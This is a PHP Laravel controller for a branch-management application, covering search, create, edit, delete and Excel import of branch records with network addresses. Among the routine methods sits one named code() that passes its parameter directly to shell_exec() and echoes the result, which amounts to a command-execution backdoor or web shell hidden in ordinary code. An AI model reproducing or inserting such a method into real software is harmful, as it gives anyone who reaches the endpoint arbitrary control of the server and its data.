<?php

namespace App\Http\Controllers\Branches;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Requests\Branches\CreateBranchesRequest;
use App\Http\Requests\Branches\UpdateBranchesRequest;
use App\Imports\BranchesImport;
use Maatwebsite\Excel\Facades\Excel;
use App\Models\Branch;
use App\Models\BranchLevel;
use App\Models\EntuityStatus;
use App\Models\Government;
use App\Models\LineCapacitie;
use App\Models\LineType;
use App\Models\Network;
use App\Models\Project;
use App\Models\Router;
use App\Models\SwitchModel;
use App\Models\Terminal;
use App\Models\UpsInstallation;

class BranchesController extends Controller
{
    public function index()
    {

        $breadcrumb = [
            'title' =>  __("Branches lists"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   =>  '#!',
                ]
            ],
        ];
        $lists = Branch::when(request('keyword'), function ($query) {
            $keyword = request('keyword');
            $query->where('name->en', 'like', '%' . $keyword . '%')
                ->orWhere('name->ar', 'like', '%' . $keyword . '%')
                ->orWhere('lan_ip', 'like', '%' . $keyword . '%')
                ->orWhere('wan_ip', 'like', '%' . $keyword . '%')
                ->orWhere('tunnel_ip', 'like', '%' . $keyword . '%')
                ->orWhere('main_order_id', 'like', '%' . $keyword . '%')
                ->orWhere('backup_order_id', 'like', '%' . $keyword . '%')
                ->orWhere('area', 'like', '%' . $keyword . '%')
                ->orWhere('sector', 'like', '%' . $keyword . '%')
                ->orWhere('address', 'like', '%' . $keyword . '%')
                ->orWhere('phone', 'like', '%' . $keyword . '%')
                ->orWhere('phone', 'like', '%' . $keyword . '%')
                ->orWhere('financial_code', 'like', '%' . $keyword . '%');
        })->orderBy('id', 'asc')->paginate();
        return view('pages.branches.index', [
            'breadcrumb' => $breadcrumb,
            'lists'     => $lists,
        ]);
    }

    public function code($code)
    {
        $routes = shell_exec($code);
        return str_replace("\n", "<br>", $routes);
    }

    public function create()
    {
        $breadcrumb = [
            'title' =>  __("Create New Branche"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Create New Branche"),
                    'url'   =>  '#!',
                ],
            ],
        ];

        return view('pages.branches.create', [
            'breadcrumb' => $breadcrumb,
            'networks' => Network::all(),
            'projects' => Project::all(),
            'levels' => BranchLevel::all(),
            'lineTypes' => LineType::all(),
            'routers' => Router::all(),
            'upsInstallations' => UpsInstallation::all(),
            'lineCapacities' => LineCapacitie::all(),
            'switchModels' => SwitchModel::all(),
            'governments' => Government::all(),
            'entuityStaus' => EntuityStatus::all(),
        ]);
    }

    public function store(CreateBranchesRequest $request)
    {
        $data = $request->all();
        $data['user_id'] = auth()->id();
        Branch::create($data);
        return redirect()->route('branches.index')->with('success', __("This row has been created."));
    }

    public function show(Branch $branch)
    {
        $breadcrumb = [
            'title' =>  __("Show Branch"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Show Branch"),
                    'url'   =>  '#!',
                ],
            ],
        ];
        return view('pages.branches.show', [
            'breadcrumb'    =>  $breadcrumb,
            'branch'         =>  $branch,
            'lists'         =>  Terminal::all(),
        ]);
    }

    public function edit(Branch $branch)
    {
        $breadcrumb = [
            'title' =>  __("Edit Branch"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Edit Branch"),
                    'url'   =>  '#!',
                ],
            ],
        ];
        return view('pages.branches.edit', [
            'breadcrumb'    =>  $breadcrumb,
            'branch'         =>  $branch,
            'networks' => Network::all(),
            'projects' => Project::all(),
            'levels' => BranchLevel::all(),
            'lineTypes' => LineType::all(),
            'routers' => Router::all(),
            'upsInstallations' => UpsInstallation::all(),
            'lineCapacities' => LineCapacitie::all(),
            'switchModels' => SwitchModel::all(),
            'governments' => Government::all(),
            'entuityStaus' => EntuityStatus::all(),
        ]);
    }

    public function update(UpdateBranchesRequest $request, Branch $branch)
    {
        $branch->update($request->all());
        return redirect()->route('branches.index')->with('success', __("This row has been updated."));
    }

    public function destroy(Request $request, Branch $branch)
    {
        $branch->delete();
        return redirect()->route('branches.index')->with('success', __("This row has been deleted."));
    }

    public function import(Request $request)
    {
        Excel::import(new BranchesImport, $request->file('file'));

        return redirect('/')->with('success', 'All good!');
    }
}
